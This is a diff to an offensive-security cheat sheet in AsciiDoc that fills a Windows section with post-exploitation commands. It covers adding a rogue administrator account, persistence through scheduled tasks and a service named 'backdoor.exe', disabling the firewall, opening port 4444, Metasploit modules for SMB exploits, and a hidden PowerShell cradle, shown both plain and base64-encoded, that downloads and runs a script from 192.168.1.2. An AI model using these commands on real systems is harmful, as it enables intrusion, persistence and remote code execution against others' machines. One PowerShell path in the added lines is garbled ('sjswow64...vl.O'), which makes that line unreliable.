@@ -1,45 +1,123 @@
 === Windows
 
+==== Version Numbers
+
+[cols="1,3"]
+|===
+|NT 5.0  |2000
+|NT 5.1  |XP 32bit
+|NT 5.2  |XP 64bit, Server 2003, Server 2003 R2
+|NT 6.0  |Vista, Server 2008
+|NT 6.1  |7, Server 2008 R2
+|NT 6.2  |8, Server 2012
+|NT 6.3  |8.1, Server 2012 R2
+|NT 10.0 |10, Server 2016, Server 2019
+|===
+
 ==== User Management
 
-TIP: TODO
+  net user brimstone password /add
+
+Add user with the username `brimstone` and password `password`.
+
+  net localgroup administrators brimstone /add
+
+Add `brimstone` to the local administrators group.
 
 ==== Scheduled Tasks
 
-TIP: TODO
+  schtasks /create /tn task name /ru system /sc onlogon /tr backdoor.exe
+
+Run task on user logon.
+
+  schtasks /create /tn task name /ru system /sc onstart /tr backdoor.exe
+
+Run task on system start.
+
+  schtasks /create /tn task name /sc onidle /i 30 /tr backdoor.exe
+
+Run task on user idle for 30 minutes.
 
 ==== Service Management
 
-TIP: TODO
+  sc query state=all
+
+Show services.
+
+  sc create backdoor binPath= "c:\backdoor.exe"
+
+Create new service with `backdoor.exe`. Must include quotes.
+
+
+==== Firewall
+
+  netsh firewall set opmode mode=DISABLE
+
+Disable on XP/2003
+
+  netsh advfirewall set  currentprofile state off
+
+Disable on 7 and later
+
+  netsh advfirewall firewall add rule name="Allow Port 4444" protocol=TCP dir=out remoteport=4444 action=allow
+
+Allow a port.
+
+  netsh advfirewall firewall add rule name="IP Allow" dir=in interface=any action=allow remoteip=192.168.1.2/32
+
+Allow a host.
+
+  netsh advfirewall firewall add rule name="Program Allow" program="c:\backdoor.exe" protocol=tcp dir=in enable=yes action=allow
+
+Allow a program.
+
 
 ==== Exploits
 ===== MS08-067
-_remote_
+
+[cols=">1,3"]
+|===
+|Affects           |XP, 2003
+|Metasploit Module |exploit/windows/smb/ms08_067_netapi
+|Type              |remote
+|===
 
 This is a vulnerability in SMB that invites `NT_AUTHORITY/SYSTEM` access.
 
-*Affects*: XP, 2003
-
-*Metasploit Module*: exploit/windows/smb/ms08_067_netapi
-
 ===== MS16-075
-_local_, _privilege escalation_
 
-Metasploit Module: exploit/windows/local/ms16_075_reflection_juicy
+[cols=">1,3"]
+|===
+|Affects           |Windows 7 on?
+|Metasploit Module |exploit/windows/local/ms16_075_reflection_juicy
+|Type              |local, privilege escalation
+|===
 
 Detection: Run `whoami /getprivs` and look for `SeImpersonate` or `SeAssignPrimaryToken`
 
 ===== MS17-010
-_remote_
+
+[cols=">1,3"]
+|===
+|Affects           |Pretty much everything. XP through Windows 10
+|Metasploit Module |exploit/windows/smb/ms17_010_psexec
+|Type              |remote
+|===
 
 This is a vulnerability in SMB that invites `NT_AUTHORITY/SYSTEM` access.
 
-[cols="1,3"]
-|===
-|Affects |Pretty much everything. XP through Windows 10
-|Metasploit Module |exploit/windows/smb/ms17_010_psexec
-|===
-
 ==== Powershell
 
-TIP: TODO
+  C:\Windows\sjswow64\WindowsPowerShell\vl.O\powershell.exe
+
+Location of 64bit ppowershell
+
+  powershell.exe -w hidden -noni -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.2/script.ps1');"
+
+Download a powershell script to memory and run it.
+
+  powershell.exe -w hidden -noni -nop -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEuMi9zY3JpcHQucHMxJyk7Cg==
+
+Same as above, but doesn't use either quote type.
+
+<<<
